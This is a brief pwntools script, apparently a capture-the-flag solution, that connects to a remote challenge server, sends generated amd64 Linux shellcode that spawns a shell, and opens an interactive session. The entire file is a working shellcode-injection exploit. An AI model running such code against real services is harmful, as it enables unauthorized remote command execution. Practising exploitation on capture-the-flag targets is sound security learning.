from pwn import *

context(arch = 'amd64' , os = 'linux', log_level = 'info')

#io = process("./shellcode")
io = remote("node4.anna.nssctf.cn", 24407)

shellcode = asm(shellcraft.sh())

io.sendline(shellcode)
io.interactive()
